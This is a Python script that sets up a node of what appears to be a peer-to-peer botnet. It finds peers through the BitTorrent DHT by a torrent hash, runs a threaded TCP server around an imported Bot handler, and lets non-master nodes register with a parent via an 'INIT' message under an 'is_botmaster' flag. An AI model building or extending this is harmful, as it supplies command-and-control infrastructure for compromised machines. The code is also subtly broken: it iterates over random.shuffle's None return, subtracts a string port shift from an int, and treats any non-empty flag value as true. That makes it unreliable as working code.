from functools import partial
from pathlib import Path
from ipaddress import ip_address
import threading
import socketserver
from typing import Iterable, Optional

from storage import BaseStorage, InMemoryStorage
from network import NetworkOptions, Address
from client import SocketClient
from bot import Bot


class ThreadedTCPServer(socketserver.ThreadingMixIn, socketserver.TCPServer):
    """For asynchronous request processing"""
    pass

def init_parent(peers: Iterable[Address], self_options: NetworkOptions) -> Optional[Address]:
    import random, os
    port_shift = os.environ.get("PORT_SHIFT", 0)
    for host, port in random.shuffle(peers):
        
        parent_address = Address(ip_address(host), max(0, int(port) - port_shift))

        parent_options = NetworkOptions(
            address = parent_address,
            buffer_size = 1024,
            encoding = "utf-8"
        )

        client = SocketClient(parent_options)
        received = client.send_message(f"INIT {self_options.address.host} {self_options.address.port}")
        if received == "OK":
            return parent_address


def run_server(
    peers: Iterable[Address], is_botmaster: bool, 
    network_options: NetworkOptions, bot_storage: BaseStorage) -> None:
    bot = partial(Bot, bot_storage, network_options)

    with ThreadedTCPServer((
        network_options.address.host, network_options.address.port), bot) as server:

        if not network_options.address.port:
            network_options.change_port(server.server_address[1])

        print("Server startup on {}".format(network_options.address))

        if not is_botmaster:
            parent = init_parent(peers, network_options)
            # TODO: handle case then parent not found
            bot_storage.change_parent(parent)

        server_thread = threading.Thread(target = server.serve_forever)
        server_thread.start(); server_thread.join()


if __name__ == "__main__":

    import btdht, binascii, dotenv, os, time, sys

    if len(sys.argv) > 2:
        print(":)"); sys.exit(-1)

    flag_name, flag_value = sys.argv[1].split("=")

    if flag_name != "is_botmaster":
        print("0_0"); sys.exit(-2)
    
    try:
        is_botmaster = bool(flag_value)
    except Exception:
        print(":("); sys.exit(-3)

    dht = btdht.DHT()
    dht.start()

    print("DHT setup")
    time.sleep(15)

    dotenv.load_dotenv("../config")
    hash = os.environ.get("TORRENT_HASH", None)
    peers = dht.get_peers(binascii.a2b_hex(hash))

    network_options = NetworkOptions(
        path = Path("data/network_options.json"),
        address = Address(ip_address("0.0.0.0"), 0),
        buffer_size = 1024,
        encoding = "utf-8"
    )

    try:
        run_server(peers, is_botmaster, network_options, bot_storage = InMemoryStorage())
    except OSError as err:
        network_options.change_port(new_port = 0)
        run_server(peers, is_botmaster, network_options, bot_storage = InMemoryStorage())
